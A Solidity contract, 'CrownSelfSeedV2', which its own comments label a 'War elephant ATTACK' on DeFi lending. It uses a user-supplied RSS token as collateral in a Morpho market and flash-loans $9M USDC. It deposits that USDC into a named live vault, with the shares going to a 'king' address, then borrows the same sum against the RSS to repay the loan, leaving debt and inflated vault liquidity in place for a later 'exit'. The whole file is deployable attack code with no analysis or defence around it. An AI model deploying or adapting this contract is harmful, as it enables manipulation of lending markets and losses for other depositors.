// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {IERC20, SafeTransfer, Ownable, ReentrancyGuard} from "./lib/Core.sol";

interface IMorphoElephant {
    struct MarketParams {
        address loanToken;
        address collateralToken;
        address oracle;
        address irm;
        uint256 lltv;
    }

    function supplyCollateral(MarketParams memory marketParams, uint256 assets, address onBehalf, bytes memory data)
        external;

    function borrow(
        MarketParams memory marketParams,
        uint256 assets,
        uint256 shares,
        address onBehalf,
        address receiver
    ) external returns (uint256, uint256);

    function flashLoan(address token, uint256 assets, bytes calldata data) external;

    function market(bytes32 id)
        external
        view
        returns (uint128, uint128, uint128, uint128, uint128, uint128);
}

interface IMorphoFlashLoanCallback {
    function onMorphoFlashLoan(uint256 assets, bytes calldata data) external;
}

interface IVaultV2Elephant {
    function deposit(uint256 assets, address receiver) external returns (uint256);
}

/// @notice War elephant ATTACK: post RSS → flash USDC → deposit King Vault V2 → borrow → repay flash.
/// @dev End: king holds V2 shares (accessible via forceDeallocate), Morpho debt = size, RSS locked.
///      Wallet liquid USDC stays ~0 until FEED (exit) on King order.
///      Vault = live V2 0xB96B…A7b9 (forceDeallocate proven). NOT old MetaMorpho yRSS.
contract CrownSelfSeedV2 is Ownable, ReentrancyGuard, IMorphoFlashLoanCallback {
    using SafeTransfer for IERC20;

    uint256 public constant ASK_USDC = 9_000_000e6; // $9M
    uint256 public constant MAX_LTV_BPS = 7000; // 70% soft cap vs ~$1 RSS

    IMorphoElephant public immutable morpho;
    IERC20 public immutable usdc;
    IERC20 public immutable rss;
    IVaultV2Elephant public immutable vault;
    address public immutable king;
    bytes32 public immutable marketId;
    IMorphoElephant.MarketParams public mp;

    bool private _locking;

    event AttackSeeded(uint256 rssColl, uint256 usdcToVault, uint256 borrowUsdc, uint256 vaultShares);

    error OnlyMorpho();
    error BadAmt();
    error Ltv();
    error NoLiquidity();

    constructor(
        address morpho_,
        address usdc_,
        address rss_,
        address vault_,
        address king_,
        bytes32 marketId_,
        address oracle_,
        address irm_,
        uint256 lltv_,
        address owner_
    ) Ownable(owner_) {
        morpho = IMorphoElephant(morpho_);
        usdc = IERC20(usdc_);
        rss = IERC20(rss_);
        vault = IVaultV2Elephant(vault_);
        king = king_;
        marketId = marketId_;
        mp = IMorphoElephant.MarketParams({
            loanToken: usdc_,
            collateralToken: rss_,
            oracle: oracle_,
            irm: irm_,
            lltv: lltv_
        });
    }

    /// @param rssAmount RSS to post (0 = full king balance)
    /// @param borrowUsdc USDC size (0 = ASK_USDC $9M)
    function attack(uint256 rssAmount, uint256 borrowUsdc) external onlyOwner nonReentrant {
        if (borrowUsdc == 0) borrowUsdc = ASK_USDC;
        if (borrowUsdc < 1_000_000e6) revert BadAmt();

        if (rssAmount == 0) rssAmount = rss.balanceOf(king);
        // borrowUsdc (6dp) / 1e6 <= rssAmount/1e18 * 0.70
        if (borrowUsdc * 1e18 > (rssAmount * MAX_LTV_BPS * 1e6) / 10_000) revert Ltv();

        rss.safeTransferFrom(king, address(this), rssAmount);
        rss.approve(address(morpho), rssAmount);
        morpho.supplyCollateral(mp, rssAmount, king, "");

        _locking = true;
        morpho.flashLoan(address(usdc), borrowUsdc, abi.encode(rssAmount, borrowUsdc));
        _locking = false;
    }

    function onMorphoFlashLoan(uint256 assets, bytes calldata data) external override {
        if (msg.sender != address(morpho)) revert OnlyMorpho();
        if (!_locking) revert OnlyMorpho();
        (uint256 rssAmount, uint256 borrowUsdc) = abi.decode(data, (uint256, uint256));
        if (assets != borrowUsdc) revert BadAmt();

        // Seed live Vault V2 (liquidityAdapter → RSS/USDC market). Shares to king.
        usdc.approve(address(vault), assets);
        uint256 shares = vault.deposit(assets, king);

        (uint128 supply,, uint128 borrow,,,) = morpho.market(marketId);
        uint256 idle = uint256(supply) > uint256(borrow) ? uint256(supply) - uint256(borrow) : 0;
        if (idle < assets) revert NoLiquidity();

        // Borrow against king's RSS (seeder must be Morpho-authorized by king)
        morpho.borrow(mp, assets, 0, king, address(this));

        usdc.approve(address(morpho), assets);
        emit AttackSeeded(rssAmount, assets, assets, shares);
    }
}
